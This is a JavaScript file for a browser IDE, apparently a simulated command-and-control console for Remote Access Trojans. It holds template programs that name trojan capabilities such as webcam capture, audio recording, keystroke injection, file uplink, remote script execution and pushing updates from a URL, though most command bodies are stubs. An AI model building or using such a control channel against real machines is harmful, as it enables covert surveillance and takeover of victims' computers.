const typer = (x) => {
 toast.publish({
  type: "robot",
  hideClose: true,
  description: `Initializing Autopilot...`,
  timeout: 1000,
 });
 hotrelod = false;
 document.getElementById("backdrop").style.display = "block";
 document.getElementById("ebar").setAttribute("class", "toolbar inbar nohover");
 document.getElementById("assets").setAttribute("class", "nobtn");
 document.getElementById("docs").setAttribute("class", "menubar-item disabled");
 const t0 = performance.now();
 if (document.getElementById("fne").textContent == "Readme.md" || document.getElementById("fne").textContent == "License.txt") {
  document.getElementById("readonly").style.display = "none";
  document.getElementById("editor").style.display = "block";
  document.getElementById("ide").setAttribute("class", "pretty-split-pane-component-inner logo");
  shakeSpeare(x, t0);
 } else {
  if (editor.getValue().length != 0) {
   let eraser = setInterval(function () {
    // console.log("clearing code...");
    editor.getSession().setValue(editor.getValue().slice(0, -1));
    if (editor.getValue().length == 0) {
     clearInterval(eraser);
     shakeSpeare(x, t0);
    }
   }, 0);
  } else {
   shakeSpeare(x, t0);
  }
 }
};

const shakeSpeare = (x, y) => {
 document.getElementById("fne").textContent = "Program-" + x + ".fdm";
 let tale;
 switch (x) {
  case 1:
   tale = `// |================================================|\n// | Program-1\n// | Description: Delete RATs from All Systems.\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nPC.All(); // Selects All Systems.\nPC.Escape(); // Initiate Escape Sequence.\n\n`;
   break;
  case 2:
   tale = `// |================================================|\n// | Program-2\n// | Description: Deletes a Specific RAT\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nvar bot="A01"\nPC.Lock(bot); // Selects 'A01'.\nPC.Escape(); // Initiate Escape Sequence. \n\n`;
   break;
  case 3:
   tale = "// |==============================================|\n// |  Program-3\n// |  Description: Check RATs Availability on all systems\n// |________________________________________________|\n\nTAR,MARCO,ENDT  // RATs will return 'POLO' if its online\n";
   break;
  case 4:
   tale = "// |==============================================|\n// |  Program-4\n// |  Description: Check if a RAT is online.\n// |________________________________________________|\n\nTAR,A01,ENDT  // Selects RAT Named 'A01'\nCMD,MARCO,ENDC // 'A01' will return 'POLO' if its online\n";
   break;
  case 5:
   tale = "// |==============================================|\n// |  Program-5\n// |  Description: Temporarily end All RAT's Execution.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 6:
   tale = "// |==============================================|\n// |  Program-6\n// |  Description: Temporarily end a specific RAT's Execution.\n// |________________________________________________|\n\nTAR,A01,ENDT  // Selects RAT Named 'A01'\nCMD,EXIT,ENDC // Terminate A01's execution\n";
   break;
  case 7:
   tale = "// |==============================================|\n// |  Program-7\n// |  Description: Update All RAT's software.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,UPDATE,ENDT  // Target Section\n// URL to the firmware file\nFILE:https://www.example.com/filename\n// The key will Auto-hide As you type..\nKEY:123456789\n// To view Hidden key : Hit CTRL + A or Toggle X-Ray by Selecting key text with cursor\n";
   break;
  case 8:
   tale = "// |==============================================|\n// |  Program-8\n// |  Description: Update software of a specific RAT.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,A01,ENDT  // Selects RAT Named 'A01'\nCMD,UPDATE,ENDC // Perform Updation sequence on 'A01'\n// URL to the firmware file\nFILE:https://www.example.com/filename\n// The key will Auto-hide As you type..\nKEY:123456789\n// To view Hidden key : Hit CTRL + A or Toggle X-Ray by Selecting key text with cursor\n";
   break;
  case 9:
   tale = "// |==============================================|\n// |  Program-9\n// |  Description: Execute VB Script on a specific system.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 10:
   tale = "// |==============================================|\n// |  Program-10\n// |  Description: Execute a Batch Script on a specific system.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 11:
   tale = "// |==============================================|\n// |  Program-11\n// |  Description: Speak a string on a specific system.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 12:
   tale = "// |==============================================|\n// |  Program-12\n// |  Description: Play an mp3 audio on a specific system.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 13:
   tale = "// |==============================================|\n// |  Program-13\n// |  Description: Show Timed message box on a specific host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 14:
   tale = "// |==============================================|\n// |  Program-14\n// |  Description: Display Message box on a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 15:
   tale = "// |==============================================|\n// |  Program-15\n// |  Description: Non-Maskable Chat with a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 16:
   tale = "// |==============================================|\n// |  Program-16\n// |  Description: Maskable Chat with a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 17:
   tale = "// |==============================================|\n// |  Program-17\n// |  Description: Auto google a query on a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 18:
   tale = "// |==============================================|\n// |  Program-18\n// |  Description: Inject keystrokes on a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 19:
   tale = "// |==============================================|\n// |  Program-19\n// |  Description: Rename a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 20:
   tale = "// |==============================================|\n// |  Program-20\n// |  Description: Find Device Location using IP Address.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 21:
   tale = "// |==============================================|\n// |  Program-21\n// |  Description: Enter hibernation mode on All RATs.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,PAUSE,ENDT  // Target Section\nARG,14,ENDA  // Hibernate for 14 Days\n// The key will Auto-hide As you type..\nKEY:123456789\n// To view Hidden key : Hit CTRL + A or Toggle X-Ray by Selecting key text with cursor\n";
   break;
  case 22:
   tale = "// |==============================================|\n// |  Program-22\n// |  Description: Enter hibernation mode on a specific RAT.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,A01,ENDT  // Selects RAT Named 'A01'\nCMD,PAUSE,ENDC // Perform Hibernation sequence\nARG,14,ENDA  // Hibernate for 14 Days\n// The key will Auto-hide As you type..\nKEY:123456789\n// To view Hidden key : Hit CTRL + A or Toggle X-Ray by Selecting key text with cursor\n";
   break;
  case 23:
   tale = "// |==============================================|\n// |  Program-23\n// |  Description: Routine Health checkup for a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 24:
   tale = "// |==============================================|\n// |  Program-24\n// |  Description: Return Disk summary for a specific system\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 25:
   tale = "// |==============================================|\n// |  Program-25\n// |  Description: Traverse through directories of a host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 26:
   tale = "// |==============================================|\n// |  Program-26\n// |  Description: Uplink a file from a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 27:
   tale = "// |==============================================|\n// |  Program-27\n// |  Description: Download a file onto a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 28:
   tale = "// |==============================================|\n// |  Program-28\n// |  Description: Record Audio activity on a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 29:
   tale = "// |==============================================|\n// |  Program-29\n// |  Description: Return process history for a specifc system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 30:
   tale = "// |==============================================|\n// |  Program-30\n// |  Description: Return Webcam image from a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 31:
   tale = "// |==============================================|\n// |  Program-31\n// |  Description: Return a Screenshot from a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 32:
   tale = "// |==============================================|\n// |  Program-32\n// |  Description: Run VB Script & escape from a specific host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  default:
   break;
 }
 let s = 0;
 let ink = setInterval(function () {
  editor.getSession().setValue(tale.substring(0, s));
  s++;
  if (s === tale.length) {
   clearInterval(ink);
   document.getElementById("ebar").setAttribute("class", "toolbar inbar");
   document.getElementById("assets").setAttribute("class", "");
   document.getElementById("backdrop").style.display = "none";
   document.getElementById("docs").setAttribute("class", "menubar-item");
   hotrelod = true;
   editor.getSession().setValue(editor.getValue() + " ");
   editor.navigateLineEnd();
   const t1 = performance.now();
   let ms = t1 - y;
   ms /= 1000;
   let latency = Math.round((ms + Number.EPSILON) * 100) / 100;
   toast.publish({
    type: "robot",
    hideClose: true,
    description: `Program Completed in  ${latency} sec`,
    timeout: 2000,
   });
  }
 }, 1);
};

const lawyer = (l) => {
 document.getElementById("editor").style.display = "none";
 document.getElementById("readonly").style.display = "block";
 document.getElementById("run").setAttribute("class", "menubar-item nohover");
 document.getElementById("ide").setAttribute("class", "pretty-split-pane-component-inner logo read");

 if (l == 0) {
  document.getElementById("fne").textContent = "Readme.md";
  document.getElementById("readonly").innerHTML = `===================================
       DOCUMENTATION
===================================

Version : 4.0.1
Last Updated : 19 Februvary 2021


 INTRODUCTION
-----------------------------------

        This is a browser based implementation of an integrated IDE and a custom programming language designed to control Remote Access Trojans (RATs) in a distributed RAT Network. The interface is designed to simulate a basic command and control facility for the communication of RATs in the Network. All RATs on the network are pre-programmed to follow the syntax and definitions of this custom language. A few examples are provided in the Wiki section. Permission for use is granted only for Educational purposes, and are strictly subjected to the conditions specified in the license agreement.



 LANGUAGE
---------------------------------
`;
 } else {
  document.getElementById("fne").textContent = "License.txt";
  document.getElementById("readonly").innerHTML = `===================================
       LICENSE / TERMS OF USE
===================================

Author: Ashik saleem

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), for use in a manner of educational purposes only, and are strictly subjected to the following conditions:-

1. USAGE FOR HACKING OR ANY ILLEGAL MEANS IS STRICTLY PROHIBITED. IN SUCH AN EVENT THE ORIGINAL OWNER IS NOT, IN ANY MANNER OF FORM RESPONSIBLE FOR THE DAMAGES CAUSED..
2. USAGE OF THIS SOFTWARE AS A COMMAND AND CONTROL FACILITY IS STRICTLY FORBIDDEN.
3. ANY ILLEGAL ACTIVITY INVOLVING THIS SOFTWARE MAY AUTOMATICALLY REVOKE THIS AGREEMENT.
4. THIS COPYRIGHT / PERMISSION NOTICE SHALL BE INCLUDED IN ALL COPIES AND IS APPLICABLE TO ALL PORTIONS OF THE SOFTWARE..
5. RESPECT PRIVACY, DONT BE A D*CK.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, AND IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
`;
 }
};
